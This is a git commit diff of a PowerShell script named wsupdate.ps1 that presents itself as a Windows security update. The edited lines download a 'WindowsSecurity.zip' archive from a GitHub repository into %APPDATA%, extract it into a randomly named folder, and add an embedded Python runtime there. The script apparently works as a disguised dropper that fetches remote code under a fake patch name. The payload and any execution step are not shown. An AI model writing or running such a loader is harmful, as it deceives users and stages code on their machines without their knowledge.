e9add160d45adced50f4505ef2a55b829b2fe826
xxoo-d <im4x5yn74x@kaiju-security.com>
2026-02-23 16:04:23 -0500

    Update wsupdate.ps1

--- wsupdate.ps1
+++ wsupdate.ps1
@@ -2,7 +2,7 @@ $Length = 10
 $Characters = 'abcdefghijklmnopqrstuvwxyz0123456789'
 $RandomString = -join ($Characters.ToCharArray() | Get-Random -Count $Length)
 $FolderName = "$RandomString"
-https://github.com/xxoo-d/Windows-Security-Patching/raw/refs/heads/main/WindowsSecurity.zip -O $env:APPDATA\WindowsSecurity.zip
+wget https://github.com/xxoo-d/Windows-Security-Patching/raw/refs/heads/main/WindowsSecurity.zip -O $env:APPDATA\WindowsSecurity.zip
 Expand-Archive -Path $env:APPDATA\WindowsSecurity.zip -DestinationPath $env:APPDATA\$FolderName
 wget https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip -O $env:APPDATA\python-3.14.0-embed-amd64.zip
 Expand-Archive -Path $env:APPDATA\python-3.14.0-embed-amd64.zip -DestinationPath $env:APPDATA\$FolderName\WindowsSecurity\
